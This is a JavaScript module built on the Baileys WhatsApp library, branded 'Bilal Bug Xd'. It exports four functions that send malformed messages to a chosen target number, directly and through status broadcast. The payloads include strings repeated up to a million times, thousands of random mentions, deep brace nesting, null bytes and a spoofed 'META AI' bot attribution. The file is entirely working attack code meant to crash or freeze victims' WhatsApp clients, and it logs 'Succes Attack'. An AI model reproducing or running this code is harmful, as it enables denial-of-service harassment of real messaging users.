const { 
  default: baileys, proto, jidNormalizedUser, generateWAMessage, 
  generateWAMessageFromContent, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");

const {
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, 
  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, 
  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, 
  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, 
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, 
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, 
  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, 
  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, 
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, 
  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, 
  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, mentionedJid, processTime, Browser, MessageType, 
  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, 
  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, 
  isBaileys, AnyMessageContent, fetchLatestBaileysVersion, 
  templateMessage, InteractiveMessage, generateMessageTag, generateMessageID, Header 
} = require("@whiskeysockets/baileys");

const crypto = require('crypto')
let client;

async function devaskNotBot(devaskNotBot, target) {
const media = await prepareWAMessageMedia(
{ image: { url: "https://i.postimg.cc/28g2ZHDw/IMG-20250825-172644-893.jpg" } },
{ upload: devaskNotBot.waUploadToServer }
);

const Interactive = {
viewOnceMessage: {
message: {
interactiveMessage: {
contextInfo: {
participant: target,
mentionedJid: [
"0@s.whatsapp.net",
...Array.from({ length: 1900 }, () =>
"1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
),
],
remoteJid: "X",
stanzaId: "123",
quotedMessage: {
paymentInviteMessage: {
serviceType: 3,
expiryTimestamp: Date.now() + 1814400000,
},
forwardedAiBotMessageInfo: {
botName: "META AI",
botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
creatorName: "Bot",
},
},
},
carouselMessage: {
messageVersion: 1,
cards: [
{
header: {
hasMediaAttachment: true,
media: media.imageMessage,
},
body: { text: "🩸⃟༑Bilal Bug" + "ꦾꦽꦿ".repeat(100000), },
nativeFlowMessage: {
buttons: [
{ name: "cta_url", buttonParamsJson: "ꦾꦽꦿ".repeat(2000), },
],
messageParamsJson: "{".repeat(10000),
},
},
],
},
},
},
},
};

await devaskNotBot.relayMessage(target, Interactive, {
messageId: null,
userJid: target,
});
}

async function protocolbug1(devaskNotBot, target, mention) {
const delaymention = Array.from({ length: 9741 }, (_, r) => ({
title: "岘�".repeat(9741),
rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
}));

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "🩸⃟༑⌁⃰𝐁𝐢𝐥𝐚𝐥 𝐁𝐮𝐠 𝐗𝐝",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "\u0000" },
contextInfo: {
mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 700000) + "@s.whatsapp.net"),
participant: target,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "9741@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: "\u0000"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};

const msg = generateWAMessageFromContent(target, MSG, {});

await devaskNotBot.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: target },
content: undefined
}
]
}
]
}
]
});

if (mention) {
await devaskNotBot.relayMessage(
target,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "\u0000" },
content: undefined
}
]
}
);
}
}

async function BlankForce(devaskNotBot, target) {
  let message = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363424218795720@newsletter",
      newsletterName: "Bilal Bug Xd Comunity" + "ោ៝".repeat(2500),
      caption: "Bilal Bug Xd" + "ោ៝".repeat(2500),
      inviteExpiration: Date.now() + 1814400000,
      contextInfo: {
        participant: target,
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "X",
        participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
        stanzaId: "123",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          },
          forwardedAiBotMessageInfo: {
            botName: "META AI",
            botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
            creatorName: "Bot"
          }
        }
      },
    },
  };
  
  await devaskNotBot.relayMessage(target, message, {
    messageId: "",
    participant: { jid: target },
  });

  const stickerMsg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_573578875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/webp",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "1173741824",
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          isAnimated: false,
          viewOnce: false,
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from({ length: 1900 }, () =>
                "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9999,
            isForwarded: true,
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: { text: "../BilalBugXd", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                      name: "call_permission_request",
                      paramsJson: "\u0000".repeat(99999),
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, stickerMsg, {});
  await devaskNotBot.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function dabraDelay1(target) {
const xput = "𑜦𑜠".repeat(1000) + "ꦾ".repeat(1000);
  try {
    const message = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "🩸⃟༑⌁⃰𝐁𝐢𝐥𝐚𝐥 𝐁𝐮𝐠 𝐗𝐝ཀ🦠", format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\x10".repeat(1045000),
                version: 3,
              },
              entryPointConversionSource: "galaxy_message",
            },
            body: {
              text: "🩸⃟༑⌁⃰𝐁𝐢𝐥𝐚𝐥 𝐁𝐮𝐠 𝐗𝐝ཀ🦠🍁" + xput,
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                  () =>
                  "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                ),
              ],
            },
        },
      },
    };
    
    const msg = generateWAMessageFromContent(target, message, {});

    await devaskNotBot.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
              },
            ],
          },
        ],
      });

    console.log("Bilal Bug Xd Succes Attack!✅");
  } catch (error) {
    console.log("❌ error:\n" + error);
  }
}

module.exports = { 
devaskNotBot,
dabraDelay1,
protocolbug1,
BlankForce
};